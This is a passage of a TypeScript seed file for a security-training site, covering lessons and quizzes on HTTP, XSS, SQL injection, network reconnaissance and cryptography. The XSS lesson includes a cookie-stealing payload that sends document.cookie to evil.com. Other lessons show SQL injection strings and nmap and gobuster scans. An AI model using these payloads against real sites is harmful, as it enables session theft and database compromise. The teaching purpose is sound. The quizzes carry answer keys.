import type { Course } from "../types/course.types";
import { LINUX_FUNDAMENTALS_COURSE } from "./linux-fundamentals";
import { WINDOWS_FUNDAMENTALS_COURSE } from "./windows-fundamentals";
import { BRUTEFORCE_CONCEPTS_COURSE } from "./bruteforce-concepts";

export const SEED_COURSES: Course[] = [
  {
    id: "web-app-security",
    title: "Web Application Security",
    description: "Master the fundamentals of web security including HTTP, XSS, and SQL injection. Learn to identify and prevent the most common web vulnerabilities.",
    level: "Beginner",
    category: "Web Security",
    estimatedDuration: "4 hours",
    sections: [
      {
        id: "sec-http",
        title: "HTTP Fundamentals",
        lessons: [
          {
            id: "lesson-http-basics",
            title: "How the Web Works",
            order: 1,
            content: [
              { type: "text", content: "The web operates on the HTTP request-response model. When you visit a URL, your browser constructs an HTTP request and sends it to the server, which processes it and returns a response containing headers and a body." },
              { type: "code", language: "http", content: "GET /api/users HTTP/1.1\nHost: example.com\nAccept: application/json\nUser-Agent: Mozilla/5.0" },
              { type: "list", items: ["GET retrieves resources without side effects", "POST submits data to be processed", "PUT replaces a resource entirely", "DELETE removes a specified resource"] },
              { type: "alert", variant: "info", content: "HTTP is stateless - each request is independent. Servers use cookies and sessions to track users across requests." },
            ],
            challenges: [
              {
                id: "ch-http-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which HTTP method is designed to retrieve data without modifying server state?",
                options: ["POST", "GET", "PUT", "PATCH"], correctAnswer: "GET",
                explanation: "GET is the standard method for retrieving resources. It should be idempotent and have no side effects on the server.",
              },
              {
                id: "ch-http-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "HTTP is a stateless protocol, meaning the server retains no memory of previous requests.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "HTTP does not maintain state between requests. Mechanisms like cookies and server-side sessions are used to simulate stateful behavior.",
              },
            ],
          },
          {
            id: "lesson-http-headers",
            title: "Security Headers",
            order: 2,
            content: [
              { type: "text", content: "HTTP security headers instruct the browser to enforce security policies. These headers are your first line of defense against common attacks like clickjacking, MIME sniffing, and protocol downgrade attacks." },
              { type: "code", language: "http", content: "Strict-Transport-Security: max-age=31536000; includeSubDomains\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nContent-Security-Policy: default-src 'self'" },
              { type: "alert", variant: "warning", content: "Missing security headers are one of the most common findings in penetration tests. Always configure them in production." },
            ],
            challenges: [
              {
                id: "ch-headers-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which HTTP header prevents a page from being loaded inside an iframe?",
                options: ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security", "X-Content-Type-Options"], correctAnswer: "X-Frame-Options",
                explanation: "X-Frame-Options with DENY or SAMEORIGIN prevents clickjacking by blocking iframe embedding of your site.",
              },
              {
                id: "ch-headers-2", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "What does the HSTS header enforce on the browser?",
                options: ["Cookie encryption", "HTTPS-only connections", "Cross-origin blocking", "Input validation"], correctAnswer: "HTTPS-only connections",
                explanation: "HTTP Strict Transport Security tells browsers to only communicate via HTTPS, preventing protocol downgrade attacks.",
              },
            ],
          },
          {
            id: "lesson-cookies-sessions",
            title: "Cookies and Sessions",
            order: 3,
            content: [
              { type: "text", content: "Cookies are small pieces of data stored by the browser and sent with every request to the originating domain. Session cookies hold a token that maps to server-side session data, enabling authentication persistence." },
              { type: "list", items: ["HttpOnly: prevents JavaScript access to the cookie", "Secure: only sent over HTTPS connections", "SameSite=Strict: blocks all cross-site cookie transmission", "Domain/Path: controls which requests include the cookie"] },
              { type: "alert", variant: "danger", content: "Never store session tokens in URL parameters. They leak through browser history, server logs, and the Referer header." },
            ],
            challenges: [
              {
                id: "ch-cookies-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which cookie attribute prevents client-side JavaScript from reading the cookie?",
                options: ["Secure", "SameSite", "HttpOnly", "Path"], correctAnswer: "HttpOnly",
                explanation: "The HttpOnly flag makes the cookie inaccessible to document.cookie, protecting against XSS-based cookie theft.",
              },
              {
                id: "ch-cookies-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "Session tokens should be transmitted as URL query parameters for maximum compatibility.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "URL parameters are logged in browser history, server access logs, and Referer headers. Use HttpOnly Secure cookies instead.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-xss",
        title: "Cross-Site Scripting",
        lessons: [
          {
            id: "lesson-xss-intro",
            title: "Understanding XSS",
            order: 4,
            content: [
              { type: "text", content: "Cross-Site Scripting (XSS) occurs when an attacker injects malicious scripts into web pages viewed by other users. The browser executes the injected code in the context of the vulnerable site, giving access to cookies, session tokens, and DOM content." },
              { type: "code", language: "html", content: "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>\n\n<!-- Stored in a comment field, executes for every visitor -->" },
              { type: "list", items: ["Reflected XSS: payload in the URL, reflected in the response", "Stored XSS: payload persisted in database, affects all viewers", "DOM-based XSS: payload manipulates client-side JavaScript"] },
            ],
            challenges: [
              {
                id: "ch-xss-intro-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which type of XSS stores the malicious payload in the application's database?",
                options: ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Self XSS"], correctAnswer: "Stored XSS",
                explanation: "Stored (persistent) XSS saves the payload server-side. It affects every user who views the compromised content.",
              },
              {
                id: "ch-xss-intro-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "XSS attacks can only be used to steal cookies from the victim.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "XSS can steal cookies, capture keystrokes, redirect users, deface pages, perform actions as the user, and much more.",
              },
            ],
          },
          {
            id: "lesson-xss-vectors",
            title: "XSS Attack Vectors",
            order: 5,
            content: [
              { type: "text", content: "XSS payloads exploit multiple injection contexts: HTML body, attributes, JavaScript strings, URLs, and CSS. Each context requires different payloads and encoding bypass techniques." },
              { type: "code", language: "html", content: "<img src=x onerror=\"alert(document.domain)\">\n<svg onload=\"fetch('/api/admin')\">\n<div style=\"background:url('javascript:alert(1)')\">" },
              { type: "alert", variant: "danger", content: "Using innerHTML or document.write with untrusted data creates DOM-based XSS. Always use textContent or a sanitization library." },
            ],
            challenges: [
              {
                id: "ch-xss-vec-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which HTML attribute in an img tag can execute JavaScript when the image fails to load?",
                options: ["onclick", "onerror", "onhover", "onfocus"], correctAnswer: "onerror",
                explanation: "The onerror event fires when an image fails to load. Setting src to an invalid value triggers the handler immediately.",
              },
              {
                id: "ch-xss-vec-2", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Why is using innerHTML with user-supplied data dangerous?",
                options: ["It is slow", "It parses and executes embedded scripts and event handlers", "It breaks the page layout", "It only works in old browsers"], correctAnswer: "It parses and executes embedded scripts and event handlers",
                explanation: "innerHTML interprets the string as HTML, allowing injected tags and event handlers to execute in the page context.",
              },
            ],
          },
          {
            id: "lesson-xss-defense",
            title: "Preventing XSS",
            order: 6,
            content: [
              { type: "text", content: "Defense against XSS requires output encoding appropriate to the context: HTML entity encoding for body content, attribute encoding for attributes, and JavaScript escaping for script contexts. Content Security Policy adds a second layer of defense." },
              { type: "code", language: "javascript", content: "// Safe: uses textContent (no HTML parsing)\nelement.textContent = userInput;\n\n// Dangerous: parses HTML from user input\nelement.innerHTML = userInput;\n\n// CSP header blocks inline scripts\n// Content-Security-Policy: script-src 'self'" },
              { type: "alert", variant: "info", content: "Modern frameworks like React automatically escape output by default. However, dangerouslySetInnerHTML and similar APIs bypass this protection." },
            ],
            challenges: [
              {
                id: "ch-xss-def-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "What is the primary defense mechanism against XSS attacks?",
                options: ["Input validation", "Output encoding", "HTTPS", "Rate limiting"], correctAnswer: "Output encoding",
                explanation: "Context-sensitive output encoding ensures user data is treated as data, not code, when rendered in HTML, attributes, or JavaScript.",
              },
              {
                id: "ch-xss-def-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "Content-Security-Policy headers can prevent the execution of inline scripts injected via XSS.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "CSP with script-src 'self' (without 'unsafe-inline') blocks all inline script execution, neutralizing most XSS payloads.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-sqli",
        title: "SQL Injection",
        lessons: [
          {
            id: "lesson-sqli-basics",
            title: "SQL Injection Basics",
            order: 7,
            content: [
              { type: "text", content: "SQL injection exploits applications that concatenate user input directly into SQL queries. By injecting SQL syntax, attackers can bypass authentication, extract data, modify records, or even execute system commands." },
              { type: "code", language: "sql", content: "-- Vulnerable query:\nSELECT * FROM users WHERE username = '' OR '1'='1' --'\n\n-- Attacker input: ' OR '1'='1' --\n-- The tautology '1'='1' makes the WHERE clause always true" },
              { type: "alert", variant: "danger", content: "SQL injection consistently ranks in the OWASP Top 10. A single vulnerable endpoint can compromise an entire database." },
            ],
            challenges: [
              {
                id: "ch-sqli-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "What type of payload causes a SQL query's WHERE clause to always evaluate as true?",
                options: ["UNION injection", "Tautology attack", "Time-based blind", "Error-based injection"], correctAnswer: "Tautology attack",
                explanation: "A tautology like OR '1'='1' creates a condition that is always true, bypassing authentication or extracting all rows.",
              },
              {
                id: "ch-sqli-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "SQL injection can be used to read arbitrary files from the database server's filesystem.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "Functions like LOAD_FILE() in MySQL and COPY in PostgreSQL can read server files when the database user has sufficient privileges.",
              },
            ],
          },
          {
            id: "lesson-sqli-advanced",
            title: "Advanced SQL Techniques",
            order: 8,
            content: [
              { type: "text", content: "When error messages are suppressed, attackers use blind SQL injection techniques. Boolean-based blind uses true/false conditions to extract data one bit at a time. Time-based blind uses SLEEP() or BENCHMARK() to infer results from response delays." },
              { type: "code", language: "sql", content: "-- Boolean-based blind:\n' AND SUBSTRING(password,1,1)='a' --\n\n-- Time-based blind:\n' AND IF(1=1, SLEEP(5), 0) --\n\n-- UNION-based extraction:\n' UNION SELECT username, password FROM admin --" },
              { type: "alert", variant: "info", content: "Tools like sqlmap automate blind SQL injection, but understanding the manual technique is essential for recognizing vulnerabilities in code review." },
            ],
            challenges: [
              {
                id: "ch-sqli-adv-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "What distinguishes blind SQL injection from classic SQL injection?",
                options: ["It uses different SQL syntax", "The application does not display error messages or query results", "It only works on NoSQL databases", "It requires admin privileges"], correctAnswer: "The application does not display error messages or query results",
                explanation: "Blind SQL injection occurs when the attacker cannot see query output or errors, requiring inference techniques to extract data.",
              },
              {
                id: "ch-sqli-adv-2", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "Which SQL keyword allows combining results from an injected query with the original query?",
                options: ["JOIN", "MERGE", "UNION", "CONCAT"], correctAnswer: "UNION",
                explanation: "UNION SELECT appends additional query results to the original output, enabling extraction of data from other tables.",
              },
            ],
          },
          {
            id: "lesson-sqli-prevention",
            title: "Preventing SQL Injection",
            order: 9,
            content: [
              { type: "text", content: "Parameterized queries (prepared statements) separate SQL logic from data, making injection structurally impossible. ORMs provide this by default, but raw query methods still require care." },
              { type: "code", language: "typescript", content: "// VULNERABLE: string concatenation\nconst query = `SELECT * FROM users WHERE id = '${userInput}'`;\n\n// SAFE: parameterized query\nconst result = await db.query(\n  'SELECT * FROM users WHERE id = $1',\n  [userInput]\n);" },
              { type: "list", items: ["Always use parameterized queries or prepared statements", "Use ORM methods instead of raw SQL when possible", "Apply least-privilege database permissions", "Validate and reject unexpected input formats"] },
            ],
            challenges: [
              {
                id: "ch-sqli-prev-1", type: "multiple-choice", difficulty: "Beginner", xpReward: 25,
                question: "What is the most effective technical defense against SQL injection?",
                options: ["Web Application Firewall", "Input length validation", "Parameterized queries", "Encoding special characters"], correctAnswer: "Parameterized queries",
                explanation: "Parameterized queries ensure user input is always treated as data, never as SQL code, eliminating injection at the structural level.",
              },
              {
                id: "ch-sqli-prev-2", type: "true-false", difficulty: "Beginner", xpReward: 25,
                question: "Input validation alone is sufficient to prevent all forms of SQL injection.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "Input validation can be bypassed with encoding tricks and alternative syntax. Parameterized queries are required for reliable protection.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "network-recon",
    title: "Network Reconnaissance & Analysis",
    description: "Learn professional network reconnaissance techniques including port scanning, service enumeration, and traffic analysis used in penetration testing.",
    level: "Intermediate",
    category: "Network Security",
    estimatedDuration: "6 hours",
    sections: [
      {
        id: "sec-protocols",
        title: "Network Protocols",
        lessons: [
          {
            id: "lesson-tcpip",
            title: "The TCP/IP Model",
            order: 1,
            content: [
              { type: "text", content: "The TCP/IP model organizes network communication into four layers: Link, Internet, Transport, and Application. Each layer encapsulates data from the layer above, adding its own headers for routing, reliability, and addressing." },
              { type: "list", items: ["Application Layer: HTTP, DNS, SSH, FTP - user-facing protocols", "Transport Layer: TCP (reliable) and UDP (fast) - end-to-end delivery", "Internet Layer: IP, ICMP, ARP - addressing and routing", "Link Layer: Ethernet, Wi-Fi - physical transmission"] },
              { type: "alert", variant: "info", content: "Understanding the layer model is essential for network security - attacks and defenses operate at specific layers." },
            ],
            challenges: [
              {
                id: "ch-tcpip-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "At which layer of the TCP/IP model does TCP operate?",
                options: ["Application", "Transport", "Internet", "Link"], correctAnswer: "Transport",
                explanation: "TCP is a Transport layer protocol providing reliable, ordered delivery of data between applications.",
              },
              {
                id: "ch-tcpip-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which protocol resolves IP addresses to MAC addresses on a local network?",
                options: ["DNS", "DHCP", "ARP", "ICMP"], correctAnswer: "ARP",
                explanation: "ARP (Address Resolution Protocol) maps IP addresses to hardware MAC addresses for local network communication.",
              },
            ],
          },
          {
            id: "lesson-dns",
            title: "DNS Architecture",
            order: 2,
            content: [
              { type: "text", content: "DNS is a hierarchical distributed database that translates domain names to IP addresses. Queries flow from recursive resolvers to root servers, TLD servers, and authoritative nameservers in a process called iterative resolution." },
              { type: "code", language: "bash", content: "# Query DNS records\ndig example.com A        # IPv4 address\ndig example.com MX       # Mail exchange\ndig example.com TXT      # Text records (SPF, DKIM)\nnslookup -type=NS example.com" },
              { type: "alert", variant: "warning", content: "DNS queries are unencrypted by default. DNS-over-HTTPS (DoH) and DNS-over-TLS (DoT) encrypt queries to prevent eavesdropping." },
            ],
            challenges: [
              {
                id: "ch-dns-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which DNS record type maps a domain name to an IPv4 address?",
                options: ["AAAA", "CNAME", "A", "PTR"], correctAnswer: "A",
                explanation: "The A record maps a hostname to a 32-bit IPv4 address. AAAA records map to IPv6 addresses.",
              },
              {
                id: "ch-dns-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which DNS record type is responsible for email routing?",
                options: ["A", "TXT", "MX", "SRV"], correctAnswer: "MX",
                explanation: "MX (Mail Exchanger) records specify the mail servers responsible for receiving email for a domain.",
              },
            ],
          },
          {
            id: "lesson-tls",
            title: "TLS and Encryption in Transit",
            order: 3,
            content: [
              { type: "text", content: "TLS secures network communication through a handshake that negotiates encryption parameters, authenticates the server via certificates, and establishes session keys. TLS 1.3 simplified the handshake to a single round-trip, improving both security and performance." },
              { type: "code", language: "text", content: "TLS 1.3 Handshake:\n1. Client Hello → supported cipher suites, key share\n2. Server Hello → selected cipher, key share, certificate\n3. Client verifies certificate chain\n4. Both derive session keys from shared secret\n5. Encrypted application data begins" },
              { type: "alert", variant: "info", content: "TLS 1.3 removed all insecure algorithms including RSA key exchange, RC4, SHA-1, and static Diffie-Hellman." },
            ],
            challenges: [
              {
                id: "ch-tls-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "What message initiates a TLS handshake?",
                options: ["Server Hello", "Client Hello", "Certificate Request", "Key Exchange"], correctAnswer: "Client Hello",
                explanation: "The Client Hello message starts the handshake by listing supported protocol versions, cipher suites, and extensions.",
              },
              {
                id: "ch-tls-2", type: "true-false", difficulty: "Intermediate", xpReward: 50,
                question: "TLS 1.3 removed support for RSA key exchange to enforce forward secrecy.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "TLS 1.3 only supports ephemeral Diffie-Hellman key exchange, ensuring forward secrecy for all connections.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-recon",
        title: "Reconnaissance Techniques",
        lessons: [
          {
            id: "lesson-port-scanning",
            title: "Port Scanning with Nmap",
            order: 4,
            content: [
              { type: "text", content: "Port scanning identifies open network services on a target host. Nmap supports multiple scan types: SYN scans send partial TCP handshakes for stealth, connect scans complete full handshakes, and UDP scans probe connectionless services." },
              { type: "code", language: "bash", content: "# SYN scan (stealth, requires root)\nsudo nmap -sS -p 1-1000 target.com\n\n# Service version detection\nnmap -sV -p 22,80,443 target.com\n\n# Aggressive scan with OS detection\nsudo nmap -A -T4 target.com" },
              { type: "alert", variant: "danger", content: "Never scan systems without explicit written authorization. Unauthorized port scanning may violate computer fraud laws." },
            ],
            challenges: [
              {
                id: "ch-nmap-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which Nmap flag performs a TCP SYN (half-open) scan?",
                options: ["-sT", "-sS", "-sU", "-sA"], correctAnswer: "-sS",
                explanation: "The -sS flag performs a SYN scan that sends SYN packets without completing the TCP handshake, making it faster and stealthier.",
              },
              {
                id: "ch-nmap-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which type of port scan completes the full TCP three-way handshake?",
                options: ["SYN scan", "FIN scan", "TCP connect scan", "NULL scan"], correctAnswer: "TCP connect scan",
                explanation: "TCP connect scan (-sT) uses the operating system's connect() call to establish full connections, which is logged but doesn't require root.",
              },
            ],
          },
          {
            id: "lesson-enumeration",
            title: "Service Enumeration",
            order: 5,
            content: [
              { type: "text", content: "After discovering open ports, enumeration identifies the exact services, versions, and configurations running on each port. Banner grabbing reads service greeting messages, while active probing sends crafted requests to fingerprint software." },
              { type: "code", language: "bash", content: "# Nmap version detection\nnmap -sV --version-intensity 5 target.com\n\n# Banner grab with netcat\nnc -v target.com 80\n\n# Web directory brute-force\ngobuster dir -u http://target.com -w /usr/share/wordlists/common.txt" },
              { type: "alert", variant: "info", content: "Version detection helps identify known CVEs. Always cross-reference discovered versions with vulnerability databases like NVD." },
            ],
            challenges: [
              {
                id: "ch-enum-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which Nmap flag enables service version detection on open ports?",
                options: ["-sS", "-sV", "-O", "-A"], correctAnswer: "-sV",
                explanation: "The -sV flag probes open ports to determine the service and version running, enabling vulnerability identification.",
              },
              {
                id: "ch-enum-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which tool is commonly used for brute-forcing web directories and files?",
                options: ["Wireshark", "Hydra", "Gobuster", "Metasploit"], correctAnswer: "Gobuster",
                explanation: "Gobuster performs directory and file brute-forcing against web servers using wordlists to discover hidden content.",
              },
            ],
          },
          {
            id: "lesson-os-fingerprint",
            title: "OS Fingerprinting",
            order: 6,
            content: [
              { type: "text", content: "OS fingerprinting determines the target's operating system by analyzing TCP/IP stack behavior. Active fingerprinting sends crafted packets and analyzes responses, while passive fingerprinting observes normal traffic patterns without sending any packets." },
              { type: "list", items: ["Active: Nmap -O sends probes and compares responses to a signature database", "Passive: p0f analyzes TCP window sizes, TTL values, and options from observed traffic", "TCP/IP stack differences include initial TTL, window size, and DF bit settings", "Linux typically uses TTL 64, Windows uses TTL 128"] },
              { type: "alert", variant: "info", content: "Passive fingerprinting is undetectable since it only observes existing traffic. It's ideal for stealthy reconnaissance." },
            ],
            challenges: [
              {
                id: "ch-osfp-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which Nmap flag activates operating system detection?",
                options: ["-sV", "-sS", "-O", "-p"], correctAnswer: "-O",
                explanation: "The -O flag enables Nmap's OS detection engine, which sends TCP/IP probes and matches responses against its fingerprint database.",
              },
              {
                id: "ch-osfp-2", type: "true-false", difficulty: "Intermediate", xpReward: 50,
                question: "Passive OS fingerprinting requires sending specially crafted packets to the target.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "Passive fingerprinting only analyzes observed network traffic without generating any packets, making it completely undetectable.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-traffic",
        title: "Traffic Analysis",
        lessons: [
          {
            id: "lesson-packet-capture",
            title: "Packet Capture with Wireshark",
            order: 7,
            content: [
              { type: "text", content: "Wireshark captures and decodes network packets in real time. Capture filters limit what is recorded at the interface level, while display filters refine what is shown from an existing capture. Following TCP streams reconstructs complete conversations." },
              { type: "code", language: "text", content: "Display Filters:\nhttp                    # All HTTP traffic\ntcp.port == 443         # HTTPS port\ndns.qry.name == \"evil.com\"  # Specific DNS query\ntcp.flags.syn == 1      # SYN packets only\nip.addr == 192.168.1.1  # Specific host" },
              { type: "alert", variant: "info", content: "Use capture filters (BPF syntax) to reduce file size during long captures. Display filters can then refine the view without data loss." },
            ],
            challenges: [
              {
                id: "ch-wireshark-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which Wireshark display filter shows only HTTP traffic?",
                options: ["tcp.port == 80", "http", "port 80", "filter http"], correctAnswer: "http",
                explanation: "The 'http' display filter matches all HTTP protocol traffic regardless of port, including dissected HTTP content.",
              },
              {
                id: "ch-wireshark-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "DNS queries are typically carried over which transport protocol and port?",
                options: ["TCP port 53", "UDP port 53", "TCP port 80", "UDP port 443"], correctAnswer: "UDP port 53",
                explanation: "Standard DNS queries use UDP port 53 for speed. TCP port 53 is used for zone transfers and responses exceeding 512 bytes.",
              },
            ],
          },
          {
            id: "lesson-protocol-analysis",
            title: "Protocol Analysis",
            order: 8,
            content: [
              { type: "text", content: "Deep protocol analysis reveals connection patterns and data flows. TCP handshake analysis verifies connection establishment, HTTP inspection reveals request methods and response codes, and DNS analysis can uncover domain resolution patterns." },
              { type: "code", language: "text", content: "TCP Three-Way Handshake:\n1. Client → SYN (seq=100)\n2. Server → SYN-ACK (seq=200, ack=101)\n3. Client → ACK (seq=101, ack=201)\n\nHTTP Status Codes:\n200 OK | 301 Moved | 403 Forbidden | 500 Server Error" },
              { type: "alert", variant: "info", content: "Incomplete TCP handshakes (SYN without SYN-ACK) may indicate firewalled ports or SYN flood attacks." },
            ],
            challenges: [
              {
                id: "ch-proto-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which TCP flags are set in the second packet of the three-way handshake?",
                options: ["SYN only", "ACK only", "SYN and ACK", "FIN and ACK"], correctAnswer: "SYN and ACK",
                explanation: "The server responds to the client's SYN with a SYN-ACK packet, acknowledging the client's sequence number and providing its own.",
              },
              {
                id: "ch-proto-2", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "Which HTTP status code indicates that the requested resource has been permanently moved?",
                options: ["200", "301", "403", "500"], correctAnswer: "301",
                explanation: "HTTP 301 Moved Permanently tells clients and search engines that the resource is now at a new URL.",
              },
            ],
          },
          {
            id: "lesson-anomaly-detection",
            title: "Detecting Network Anomalies",
            order: 9,
            content: [
              { type: "text", content: "Network anomaly detection compares observed traffic against established baselines. Indicators of compromise include unexpected outbound connections, regular interval beaconing to external hosts, unusual DNS patterns, and large data transfers during off-hours." },
              { type: "list", items: ["Regular beaconing intervals suggest command-and-control communication", "DNS tunneling uses TXT or NULL records to exfiltrate data", "Unusual ports or protocols may indicate backdoor activity", "Encrypted traffic to unknown destinations warrants investigation"] },
              { type: "alert", variant: "warning", content: "Establish network baselines during normal operations before attempting anomaly detection. Without a baseline, everything looks anomalous." },
            ],
            challenges: [
              {
                id: "ch-anomaly-1", type: "multiple-choice", difficulty: "Intermediate", xpReward: 50,
                question: "What network behavior pattern is a strong indicator of command-and-control (C2) communication?",
                options: ["Large file downloads", "Regular interval beaconing to external hosts", "High bandwidth usage", "Multiple DNS queries"], correctAnswer: "Regular interval beaconing to external hosts",
                explanation: "C2 implants typically beacon at fixed or jittered intervals, creating a distinctive pattern in network traffic analysis.",
              },
              {
                id: "ch-anomaly-2", type: "true-false", difficulty: "Intermediate", xpReward: 50,
                question: "Unusually large DNS TXT records may indicate data exfiltration via DNS tunneling.",
                options: ["True", "False"], correctAnswer: "True",
                explanation: "DNS tunneling encodes data in DNS queries and responses (often TXT records), bypassing firewalls that allow DNS traffic.",
              },
            ],
          },
        ],
      },
    ],
  },
  {
    id: "applied-cryptography",
    title: "Applied Cryptography",
    description: "Deep dive into symmetric and asymmetric encryption, hash functions, digital signatures, and PKI. Understand the cryptographic foundations of modern security.",
    level: "Advanced",
    category: "Cryptography",
    estimatedDuration: "8 hours",
    sections: [
      {
        id: "sec-symmetric",
        title: "Symmetric Encryption",
        lessons: [
          {
            id: "lesson-block-ciphers",
            title: "Block Cipher Modes",
            order: 1,
            content: [
              { type: "text", content: "Block ciphers encrypt fixed-size blocks of plaintext. The mode of operation determines how multiple blocks are chained together. ECB processes blocks independently (insecure), CBC chains blocks with XOR, and CTR converts the block cipher into a stream cipher. GCM adds authentication." },
              { type: "code", language: "text", content: "ECB: Block₁→Enc→Cipher₁  (identical blocks = identical ciphertext)\nCBC: Block₁ ⊕ IV → Enc → Cipher₁, Block₂ ⊕ Cipher₁ → Enc → Cipher₂\nCTR: Enc(Nonce‖Counter) ⊕ Block → Cipher  (parallelizable)\nGCM: CTR mode + GHASH authentication tag" },
              { type: "alert", variant: "danger", content: "Never use ECB mode. It preserves plaintext patterns - encrypting a bitmap with ECB reveals the image structure in the ciphertext." },
            ],
            challenges: [
              {
                id: "ch-block-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Why is ECB mode considered insecure for encrypting structured data?",
                options: ["It uses too small a key", "Identical plaintext blocks produce identical ciphertext blocks", "It does not use an IV", "It is too slow for large files"], correctAnswer: "Identical plaintext blocks produce identical ciphertext blocks",
                explanation: "ECB encrypts each block independently, so patterns in the plaintext are preserved in the ciphertext, leaking information.",
              },
              {
                id: "ch-block-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Which block cipher mode provides both confidentiality and authentication?",
                options: ["ECB", "CBC", "CTR", "GCM"], correctAnswer: "GCM",
                explanation: "GCM (Galois/Counter Mode) combines CTR-mode encryption with GHASH authentication, providing authenticated encryption.",
              },
            ],
          },
          {
            id: "lesson-aes",
            title: "AES Deep Dive",
            order: 2,
            content: [
              { type: "text", content: "AES (Advanced Encryption Standard) is a symmetric block cipher with a fixed 128-bit block size and key sizes of 128, 192, or 256 bits. Each round applies four transformations: SubBytes (S-box substitution), ShiftRows, MixColumns, and AddRoundKey." },
              { type: "list", items: ["AES-128: 10 rounds with 128-bit key", "AES-192: 12 rounds with 192-bit key", "AES-256: 14 rounds with 256-bit key", "SubBytes provides non-linearity, MixColumns provides diffusion"] },
              { type: "alert", variant: "info", content: "AES-256 is approved for TOP SECRET classification by the NSA. No practical attack against full AES has ever been demonstrated." },
            ],
            challenges: [
              {
                id: "ch-aes-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "What is the block size used by all variants of AES?",
                options: ["64 bits", "128 bits", "256 bits", "Variable"], correctAnswer: "128 bits",
                explanation: "AES always operates on 128-bit (16-byte) blocks regardless of key size. Only the number of rounds changes with key length.",
              },
              {
                id: "ch-aes-2", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "How many rounds does AES-256 perform during encryption?",
                options: ["10", "12", "14", "16"], correctAnswer: "14",
                explanation: "AES-256 performs 14 rounds of substitution, permutation, mixing, and key addition to achieve its security level.",
              },
            ],
          },
          {
            id: "lesson-key-mgmt",
            title: "Key Management",
            order: 3,
            content: [
              { type: "text", content: "Key management encompasses generation, storage, rotation, and destruction of cryptographic keys. Password-based key derivation uses functions like Argon2 or scrypt to stretch passwords into strong keys. Hardware Security Modules (HSMs) provide tamper-resistant key storage." },
              { type: "code", language: "typescript", content: "import { scrypt } from 'crypto';\n\n// Derive encryption key from password\nconst key = await scrypt(password, salt, 32); // 256-bit key\n\n// Argon2id is preferred for password hashing\n// - Memory-hard: resists GPU/ASIC attacks\n// - Time cost: configurable iteration count" },
              { type: "alert", variant: "danger", content: "Never store encryption keys alongside the encrypted data. A database breach would compromise both the ciphertext and the keys." },
            ],
            challenges: [
              {
                id: "ch-keymgmt-1", type: "multiple-choice", difficulty: "Advanced", xpReward: 75,
                question: "Which key derivation function is currently recommended for password hashing?",
                options: ["MD5", "SHA-256", "bcrypt", "Argon2"], correctAnswer: "Argon2",
                explanation: "Argon2 (specifically Argon2id) is the winner of the Password Hashing Competition and provides memory-hard, time-configurable key derivation.",
              },
              {
                id: "ch-keymgmt-2", type: "true-false", difficulty: "Advanced", xpReward: 75,
                question: "Storing encryption keys in the same database as the encrypted data is an acceptable practice.",
                options: ["True", "False"], correctAnswer: "False",
                explanation: "If the database is breached, the attacker obtains both the ciphertext and keys. Keys must be stored separately, ideally in an HSM.",
              },
            ],
          },
        ],
      },
      {
        id: "sec-asymmetric",
        title: "Asymmetric Cryptography",
        lessons: [
          {
            id: "lesson-rsa",
            title: "RSA Fundamentals",
            order: 4,
            content: [
              { type: "text", content: "RSA is an asymmetric algorithm where the public key encrypts and the private key decrypts. Its security relies on the difficulty of factoring the product of two large primes. RSA is used for key exchange, digital signatures, and encrypting small amounts of data." },
